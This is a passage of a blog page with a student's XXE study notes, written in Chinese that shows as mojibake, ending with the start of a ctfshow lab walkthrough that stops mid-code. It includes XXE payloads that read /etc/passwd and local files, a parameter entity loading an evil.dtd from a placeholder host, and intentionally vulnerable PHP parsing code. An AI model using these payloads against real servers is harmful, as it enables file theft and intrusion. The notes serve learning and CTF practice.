<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="John Doe"/><meta name="copyright" content="John Doe"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="Hexo Theme MEOW"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="XXE | Meiçš„å°çª"/><meta name="apple-mobile-web-app-title" content="XXE | Meiçš„å°çª"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="http://example.com/2025/03/27/XXE/"/><meta name="description" content="XXEå­¦ä¹ ç¬”è®°å‰è¨€æœ€è¿‘å¤©æ°”ç‚çƒ­ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸é”™ï¼Œæ¯”å†¬å¤©çš„æ—¶å€™å¥½å¤ªå¤šäº†ã€‚å¤å¤©ä¹Ÿé©¬ä¸Šå°±è¦åˆ°äº†ï¼Œè™½ç„¶è·ç¦»é«˜è€ƒåªæœ‰çŸ­çŸ­72å¤©äº†ï¼Œä½†æ˜¯æˆ‘åªæƒ³è¯´å¤§ä¸€çˆ±çœ‹ã€‚åšé¢˜ç°åœ¨ä¹Ÿå¼€å§‹é‡åˆ°XXEäº†ï¼Œå¯ä»¥å­¦ä¸€ä¸‹ï¼Œé¿å…åé¢æ¥è¡¥ 1.XXEæ¼æ´åŸç†XXEï¼šå…¨ç§°ä¸ºXML Enternal Entity Injectionï¼Œä¸­æ–‡åç§°ï¼šXMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ æ¼æ´æˆå› ï¼šè§£ææ—¶æœªå¯¹XMLå¤–éƒ¨å®ä½“åŠ ä»¥é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°XML...">
<meta property="og:type" content="article">
<meta property="og:title" content="XXE | Meiçš„å°çª">
<meta property="og:url" content="http://example.com/2025/03/27/XXE/index.html">
<meta property="og:site_name" content="Meiçš„å°çª">
<meta property="og:description" content="XXEå­¦ä¹ ç¬”è®°å‰è¨€æœ€è¿‘å¤©æ°”ç‚çƒ­ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸é”™ï¼Œæ¯”å†¬å¤©çš„æ—¶å€™å¥½å¤ªå¤šäº†ã€‚å¤å¤©ä¹Ÿé©¬ä¸Šå°±è¦åˆ°äº†ï¼Œè™½ç„¶è·ç¦»é«˜è€ƒåªæœ‰çŸ­çŸ­72å¤©äº†ï¼Œä½†æ˜¯æˆ‘åªæƒ³è¯´å¤§ä¸€çˆ±çœ‹ã€‚åšé¢˜ç°åœ¨ä¹Ÿå¼€å§‹é‡åˆ°XXEäº†ï¼Œå¯ä»¥å­¦ä¸€ä¸‹ï¼Œé¿å…åé¢æ¥è¡¥ 1.XXEæ¼æ´åŸç†XXEï¼šå…¨ç§°ä¸ºXML Enternal Entity Injectionï¼Œä¸­æ–‡åç§°ï¼šXMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚ æ¼æ´æˆå› ï¼šè§£ææ—¶æœªå¯¹XMLå¤–éƒ¨å®ä½“åŠ ä»¥é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°XML...">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2025/03/27/XXE/assets/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2025-03-27T11:11:19.000Z">
<meta property="article:modified_time" content="2025-03-28T02:55:27.891Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2025/03/27/XXE/assets/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>XXE | Meiçš„å°çª</title><link rel="shortcut icon" href="/assets/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 7.3.0"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="Home"><div>Meiçš„å°çª</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>Articles</span></a><ul class="sub-menu-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>Archives</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>Categories</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>Tags</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>About</span></a></li></ul></div></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="Toggle Menu"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="Home"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="Home">Meiçš„å°çª</a></div><div class="menu-aside-item"><a href="javascript:void(0);"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>Articles</span></a><ul class="menu-aside-sub-item"><li><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>Archives</span></a></li><li><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>Categories</span></a></li><li><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>Tags</span></a></li><li><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>About</span></a></li></ul></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/assets/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">ã€Œ MEOW ã€</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">XXE</h1><div class="post-author"><span>Author: John Doe</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>Created: 2025-03-27</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>Updated: 2025-03-28</span></div></div><div class="post-read"></div></div><div class="post-attribute"></div></div><div class="post markdown" indent="false"><h1 id="XXEå­¦ä¹ ç¬”è®°"><a href="#XXEå­¦ä¹ ç¬”è®°" class="headerlink" title="XXEå­¦ä¹ ç¬”è®°"></a>XXEå­¦ä¹ ç¬”è®°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¤©æ°”ç‚çƒ­ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸é”™ï¼Œæ¯”å†¬å¤©çš„æ—¶å€™å¥½å¤ªå¤šäº†ã€‚å¤å¤©ä¹Ÿé©¬ä¸Šå°±è¦åˆ°äº†ï¼Œè™½ç„¶è·ç¦»é«˜è€ƒåªæœ‰çŸ­çŸ­72å¤©äº†ï¼Œä½†æ˜¯æˆ‘åªæƒ³è¯´å¤§ä¸€çˆ±çœ‹ã€‚åšé¢˜ç°åœ¨ä¹Ÿå¼€å§‹é‡åˆ°XXEäº†ï¼Œå¯ä»¥å­¦ä¸€ä¸‹ï¼Œé¿å…åé¢æ¥è¡¥</p>
<h2 id="1-XXEæ¼æ´åŸç†"><a href="#1-XXEæ¼æ´åŸç†" class="headerlink" title="1.XXEæ¼æ´åŸç†"></a>1.XXEæ¼æ´åŸç†</h2><p>XXEï¼šå…¨ç§°ä¸ºXML Enternal Entity Injectionï¼Œä¸­æ–‡åç§°ï¼šXMLå¤–éƒ¨å®ä½“æ³¨å…¥ã€‚</p>
<p><strong>æ¼æ´æˆå› ï¼šè§£ææ—¶æœªå¯¹XMLå¤–éƒ¨å®ä½“åŠ ä»¥é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°XMLä¸­ï¼Œå¯¼è‡´æœåŠ¡å™¨åŠ è½½æ¶æ„çš„å¤–éƒ¨å®ä½“å¼•å‘æ–‡ä»¶è¯»å–ï¼ŒSSRFï¼Œå‘½ä»¤æ‰§è¡Œç­‰å±å®³æ“ä½œã€‚</strong></p>
<p>ç‰¹å¾ï¼šåœ¨HTTPçš„RequestæŠ¥æ–‡å‡ºç°ä¸€ä¸‹è¯·æ±‚æŠ¥æ–‡ï¼Œå³è¡¨æ˜æ­¤æ—¶æ˜¯é‡‡ç”¨XMLè¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå°±å¯ä»¥æµ‹è¯•æ˜¯å¦å­˜åœ¨XMLæ¼æ´ã€‚</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-type:text/xml application/xml</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>æˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹XML</p>
<p>ç®€å•äº†è§£XMLï¼š</p>
<p>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰<br>XML æ˜¯ä¸€ç§æ ‡è®°è¯­è¨€ï¼Œå¾ˆç±»ä¼¼ HTML<br>XML è¢«è®¾è®¡ä¸ºä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œå…¶ç„¦ç‚¹æ˜¯æ•°æ®çš„å†…å®¹ XML è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯<br>XML å…è®¸åˆ›ä½œè€…å®šä¹‰è‡ªå·±çš„æ ‡ç­¾å’Œè‡ªå·±çš„æ–‡æ¡£ç»“æ„<br>è¯­æ³•ï¼š</p>
<p>XMLå…ƒç´ éƒ½å¿…é¡»æœ‰å…³é—­æ ‡ç­¾ã€‚<br>XML æ ‡ç­¾å¯¹å¤§å°å†™æ•æ„Ÿã€‚<br>XML å¿…é¡»æ­£ç¡®åœ°åµŒå¥—ã€‚<br>XML æ–‡æ¡£å¿…é¡»æœ‰æ ¹å…ƒç´ ã€‚<br>XML çš„å±æ€§å€¼é¡»åŠ å¼•å·ã€‚<br>ç»“æ„ï¼š</p>
<p>XML æ–‡æ¡£å£°æ˜ï¼Œåœ¨æ–‡æ¡£çš„ç¬¬ä¸€è¡Œ<br>XML æ–‡æ¡£ç±»å‹å®šä¹‰ï¼Œå³DTDï¼ŒXXE æ¼æ´æ‰€åœ¨çš„åœ°æ–¹<br>XML æ–‡æ¡£å…ƒç´ </p>
<p><strong>DTD</strong></p>
<p>æ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆDTDï¼‰ï¼šå¯ä»¥åˆæ³•çš„XMLæ–‡æ¡£æ„å»ºæ¨¡å—ï¼Œå¯ä»¥è¢«å£°æ˜åœ¨XMLçš„æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºä¸€ä¸ªå¤–éƒ¨çš„å¼•ç”¨ã€‚è¿™é‡Œä¹Ÿå°±æ˜¯XXEå­˜åœ¨çš„åœ°æ–¹ã€‚</p>
<p>DTDæ–‡æ¡£çš„ä¸‰ç§æ ¼å¼ï¼š</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.å†…éƒ¨DTDæ–‡æ¡£</span><br><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´ [å®šä¹‰å†…å®¹]&gt;</span><br><span class="line"> </span><br><span class="line">2.å¤–éƒ¨DTDæ–‡æ¡£</span><br><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;DTDæ–‡ä»¶è·¯å¾„&quot;&gt;</span><br><span class="line"> </span><br><span class="line">3.å†…å¤–éƒ¨DTDæ–‡æ¡£ç»“åˆ</span><br><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;DTDæ–‡ä»¶è·¯å¾„&quot; [å®šä¹‰å†…å®¹]&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>å†…éƒ¨å®ä½“</p>
<p>å†…éƒ¨å®ä½“å‡ ä¹æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨ä»·å€¼</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br><span class="line"> </span><br><span class="line">ä¾‹å¦‚ï¼š</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">	&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">	&lt;!ENTITY xxe &quot;hello&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>å¤–éƒ¨å®ä½“</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">æœ‰SYSTEMå’ŒPUBLICä¸¤ä¸ªå…³é”®å­—ï¼Œè¡¨ç¤ºå®ä½“æ¥è‡ªæœ¬åœ°è®¡ç®—æœºè¿˜æ˜¯å…¬å…±è®¡ç®—æœºï¼Œ</span><br><span class="line">å¤–éƒ¨å®ä½“çš„å¼•ç”¨å¯ä»¥åˆ©ç”¨å¦‚ä¸‹åè®®</span><br><span class="line">file:///path/to/file.ext</span><br><span class="line">http://url/file.ext</span><br><span class="line">php://filter/read=convert.base64-encode/resource=conf.php</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">ä¾‹å¦‚:</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">	&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">	&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;evil;&lt;/foo&gt;</span><br><span class="line"> </span><br><span class="line">å¤–éƒ¨evil.dtdä¸­çš„å†…å®¹</span><br><span class="line">&lt;!ENTITY evil SYSTEM â€œfile:///d:/1.txtâ€ &gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>%xxeæ‰§è¡Œåä¼šåŠ è½½å¤–éƒ¨å®ä½“ evil.dtd å¹¶æ‰§è¡Œï¼Œå¾—åˆ°çš„ç»“æœä¼šæ”¾åœ¨&lt;foo&gt;&lt;&#x2F;foo&gt;ä¸­ã€‚</p>
<h2 id="2-XXEæ¼æ´åˆ©ç”¨"><a href="#2-XXEæ¼æ´åˆ©ç”¨" class="headerlink" title="2.XXEæ¼æ´åˆ©ç”¨"></a>2.XXEæ¼æ´åˆ©ç”¨</h2><p>XXE å’Œ SQLæ³¨å…¥ çš„æ”»å‡»æ–¹æ³•ä¹Ÿæœ‰ä¸€ç‚¹ç›¸ä¼¼ï¼Œä¹Ÿåˆ†æœ‰å›æ˜¾å’Œæ²¡æœ‰å›æ˜¾</p>
<p>æœ‰å›æ˜¾çš„æƒ…å†µå¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸­çœ‹åˆ°payloadçš„æ‰§è¡Œç»“æœæˆ–ç°è±¡ï¼Œæ— å›æ˜¾çš„æƒ…å†µåˆç§°ä¸º blind xxeï¼ˆç±»ä¼¼äºå¸ƒå°”ç›²æ³¨ã€æ—¶é—´ç›²æ³¨ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®(OOB)é€šé“æå–æ•°æ®</p>
<p>æˆ‘ä»¬ä¸»è¦ä½¿ç”¨çš„å°±æ˜¯xmlä¸­å¼•ç”¨å¤–éƒ¨æ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹è·¯å¾„å»è®©å…¶è®¿é—®æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<h3 id="1-æ–‡ä»¶è¯»å–"><a href="#1-æ–‡ä»¶è¯»å–" class="headerlink" title="1.æ–‡ä»¶è¯»å–"></a>1.æ–‡ä»¶è¯»å–</h3><p><strong>æœ‰å›æ˜¾</strong></p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xml&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>((<span class="keyword">string</span>)<span class="variable">$xml</span>);<span class="comment">//æœ‰å›æ˜¾</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>simplexml_load_string()è§£ææ¥æ”¶è¿‡æ¥çš„XMLä»£ç </p>
<p>payload:</p>
<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM &quot;file:///D://1.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<h2 id="3-ctfshow"><a href="#3-ctfshow" class="headerlink" title="3.ctfshow"></a>3.ctfshow</h2><p>çœŸçš„è¯´ï¼Œå­¦è¿™ä¸ªå°±æ˜¯ä¸ºäº†æ‰“ctfï¼Œè¦å­¦çš„ä¸œè¥¿çœŸçš„å¥½å¤šå•Š</p>
<h3 id="1-373å…³-æœ‰å›æ˜¾"><a href="#1-373å…³-æœ‰å›æ˜¾" class="headerlink" title="1.373å…³  æœ‰å›æ˜¾"></a>1.373å…³  æœ‰å›æ˜¾</h3><p>ç¬¬ä¸€æ¬¡çœ‹æºä»£ç ï¼Œå…ˆè§£é‡Šä¸€ä¸‹</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//å¯ç”¨å¤–éƒ¨å®ä½“åŠ è½½</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="comment">//åˆ›å»ºDOMæ–‡æ¡£å¯¹è±¡ï¼ŒåŒæ—¶è¿™ä¸ªå˜é‡ä¹Ÿå¯ä»¥å‚¨å­˜xmlæä¾›äº†å®¹å™¨</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="comment">//é€šè¿‡loadXMLï¼Œå°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºxmlï¼Œä¹Ÿå¯ä»¥åŠ è½½æœ¬åœ°æ–‡ä»¶ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬è¯»å–æœ¬åœ°æ–‡ä»¶çš„ç ´ç»½</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="comment">//é€šè¿‡simplexml_import_dom()å°†å°†DOMå¯¹è±¡è½¬æ¢ä¸ºSimpleXMLå¯¹è±¡</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line"><span 